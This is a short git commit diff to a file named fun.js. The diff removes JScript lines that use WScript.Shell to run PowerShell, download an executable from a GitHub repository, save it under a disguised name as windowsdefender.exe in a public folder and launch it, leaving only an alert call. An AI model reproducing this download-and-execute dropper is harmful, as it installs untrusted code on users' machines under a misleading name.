8522e50140b9b61657fb38529ca2e5072b34adfc
wcn198 <90110952+wcn198@users.noreply.github.com>
2022-07-04 20:46:29 +0100

    Update fun.js

--- fun.js
+++ fun.js
@@ -1,4 +1,1 @@
-alert(1);
-var object = new ActiveXObject("WScript.Shell");
-object.Run("powershell.exe Invoke-WebRequest -Uri 'https://github.com/wcn198/test-application/raw/main/test-file.exe' -OutFile 'C:\Users\Public\windowsdefender.exe'");
-object.Run("cmd.exe /c start C:\Users\Public\windowsdefender.exe");
+alert(1)
